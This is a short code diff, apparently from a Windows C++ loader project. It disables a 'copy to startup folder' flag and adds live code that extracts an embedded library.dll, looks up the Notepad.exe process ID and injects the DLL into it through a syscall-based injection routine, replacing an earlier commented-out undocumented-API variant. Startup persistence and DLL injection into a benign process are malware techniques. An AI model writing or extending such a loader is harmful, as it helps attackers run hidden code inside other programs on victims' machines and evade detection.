@@ -6,15 +6,9 @@
 #include "Utils/ProcUtils.h"
 #include "Utils/FilesystemUtils.h"
 
-#define COPY_TO_STARTUP_FOLDER true
+#define COPY_TO_STARTUP_FOLDER false
 
-//    const std::wstring dllPath = GetAbsolutePathOfFile(L"library.dll");
-//    DWORD notepadPid = GetPidByName(L"Notepad.exe");
-//
-//    std::wcout << L"Notepad PID: " << notepadPid<<std::endl;
-//    std::wcout << L"Dll full path: " << dllPath<<std::endl;
-//
-//    InjectProcessUndocumented(notepadPid, dllPath);
+
 
 
 
@@ -35,6 +29,15 @@ int main() {
     }
 
     ExtractLibrary();
+
+
+    const std::wstring dllPath = GetAbsolutePathOfFile(L"library.dll");
+    DWORD notepadPid = GetPidByName(L"Notepad.exe");
+
+    std::wcout << L"Notepad PID: " << notepadPid<<std::endl;
+    std::wcout << L"Dll full path: " << dllPath<<std::endl;
+
+    InjectProcessSyscall(notepadPid, dllPath);
 
 
     return 0;
